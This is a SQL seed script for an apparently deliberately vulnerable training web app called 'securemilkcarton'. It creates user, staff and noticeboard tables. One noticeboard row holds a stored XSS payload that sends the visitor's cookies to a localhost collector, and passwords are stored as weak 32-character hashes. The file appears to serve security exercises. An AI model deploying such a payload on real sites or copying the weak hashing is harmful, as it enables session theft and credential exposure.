-- Create Database
CREATE DATABASE `securemilkcarton`;

-- Insert a table for users
CREATE TABLE `securemilkcarton`.`users` (
    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `username` VARCHAR(20) NOT NULL,
    `password` CHAR(32) NOT NULL,
	`salt` CHAR(24) NOT NULL
) ENGINE = InnoDB;

-- Insert the securemilkcarton users
INSERT INTO `securemilkcarton`.`users` VALUES (null, 'user', '88c1ecd842b7da2840754c9718ac3f43', "rD4CLcy5VvvFOKVsZHaENg=="); 
INSERT INTO `securemilkcarton`.`users` VALUES (null, 'milk_man', '6cb29b9a6a7eb9b256138816d908c382', "SaAkwYP3r2gCOMD9OfTnrw=="); 
INSERT INTO `securemilkcarton`.`users` VALUES (null, 'the_boss', 'e8bcd404315a81bdb5974591779752c8', "ZY9gxoEjjMrUaLMbVgHEEA=="); 

-- Create table for employee lookup
CREATE TABLE `securemilkcarton`.`members` (
    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `username` VARCHAR(20) NOT NULL,
    `name` VARCHAR(30) NOT NULL,
    `description` VARCHAR(50) NOT NULL
) ENGINE = InnoDB;

-- Insert securemilkcarton employees
INSERT INTO `securemilkcarton`.`members` VALUES (null, 'user', 'Test User', 'Default test user'); 
INSERT INTO `securemilkcarton`.`members` VALUES (null, 'milk_man', 'Jerry Hill', 'Milk delivery agent'); 
INSERT INTO `securemilkcarton`.`members` VALUES (null, 'the_boss', 'Jenifer Milne', 'Chief executive officer'); 

-- Create table for noticeboard
CREATE TABLE `securemilkcarton`.`noticeboard` (
    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `name` VARCHAR(50) NOT NULL,
    `comments` VARCHAR(300) NOT NULL
) ENGINE = InnoDB;

-- Insert records into noticeboard table
INSERT INTO `securemilkcarton`.`noticeboard` VALUES (null, 'Really Bad Web Developer', 'This is an automated test post. I am a robot!');
INSERT INTO `securemilkcarton`.`noticeboard` VALUES (null, 'TheMilkMan', '<script>new Image().src=”http://localhost/cookie.php?”+document.cookie;</script>');
